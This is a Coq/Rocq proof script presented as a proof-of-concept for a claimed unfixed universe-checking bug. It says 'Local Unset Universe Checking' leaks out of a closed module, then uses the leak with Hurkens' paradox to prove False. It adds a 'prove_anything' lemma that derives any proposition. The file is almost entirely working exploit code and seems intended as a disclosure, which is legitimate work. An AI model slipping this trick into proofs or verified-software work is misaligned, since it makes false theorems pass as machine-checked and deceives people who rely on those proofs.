(* ============================================================
   CVE-2026-72714 — Rocq/Coq Universe Checking Desync

   Proves False in Coq/Rocq <= 9.2.0 by exploiting the universe
   checking flag leak through module close.

   Bug:     rocq-prover/rocq#22287
   CVE:     CVE-2026-72714
   Status:  0-day — unfixed as of Rocq 9.2.0

   Trigger: "Local Unset Universe Checking" inside a module
   causes the flag to persist after the module closes, allowing
   universe-inconsistent definitions in safe code.
   ============================================================ *)

(* Step 1: Trigger the bug.

   "Local Unset Universe Checking" should be scoped to the module.
   Due to the bug, the flag leaks: universe checking stays off
   after "End _Desync." *)
Module _Desync.
  Local Unset Universe Checking.
End _Desync.

(* Step 2: Create a retraction from Type to Prop.

   With universe checking still off (the bug!), Coq accepts these
   definitions without verifying the universe constraint
   Type@{u} <= Prop, which is always false (Prop is the smallest
   universe). *)
Definition down (X : Type) : Prop := X.
Definition up   (X : Prop) : Type := X.

(* Both are identity functions, so the round-trip is reflexivity. *)
Lemma up_down : forall (X : Type), up (down X) = X.
Proof. reflexivity. Qed.

(* Step 3: Hurkens' paradox.

   A retraction from a predicative universe (Type) into an
   impredicative one (Prop) is impossible in a consistent system.
   Coq's standard library formalises this as
   NoRetractFromTypeToProp.paradox, which proves "forall P:Prop, P"
   — i.e. every proposition holds, including False. *)
Require Import Coq.Logic.Hurkens.

Theorem unsound : False.
Proof.
  exact (NoRetractFromTypeToProp.paradox down up up_down False).
Qed.

(* Convenience: prove anything from the inconsistency. *)
Theorem prove_anything : forall (P : Prop), P.
Proof.
  intro P. exact (False_rect P unsound).
Qed.
